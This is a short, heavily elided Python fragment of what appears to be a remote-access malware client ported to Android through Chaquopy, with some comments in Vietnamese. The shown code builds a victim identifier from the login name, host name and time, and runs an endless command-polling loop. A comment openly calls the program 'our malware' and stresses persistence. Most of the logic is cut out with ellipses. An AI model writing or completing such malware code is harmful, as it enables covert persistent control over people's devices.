...
# For Android (Linux-like)
from os import getenv, uname, chdir, getcwd

# For a Linux OS, obtain unique identifying information (Android is Linux-based)
client = (getenv("LOGNAME", "android") + "@" + uname().nodename + "@" + str(time()))  # Fix for Android user
...
def main():
    """ Main loop for Chaquopy call from Java """
    ...
    while True:
        ...
        # The "client kill" command will shut down our malware; make sure we have persistence!
            ...
            return  # Exit main() thay vì exit() để không kill app
        ...
        sleep(DELAY)  # Delay sau lệnh

if __name__ == "__main__":
    main()  # Chạy nếu gọi trực tiếp